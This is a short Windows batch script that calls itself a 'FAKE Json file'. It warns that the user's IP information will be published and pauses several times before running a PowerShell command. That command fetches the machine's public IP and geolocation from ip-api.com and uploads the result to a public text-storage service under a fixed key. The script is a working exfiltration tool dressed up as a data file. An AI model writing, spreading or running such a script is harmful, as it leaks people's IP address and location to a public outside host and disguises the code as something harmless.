@echo off
echo This is a FAKE Json file!
echo If you continue,your IP information will be published!
echo PRESS CTRL+C TO CANCEL
pause
pause
pause
powershell "curl ('https://api.textdb.online/update?key=klhuaaaa&value='+@(curl http://ip-api.com/json/).Content)"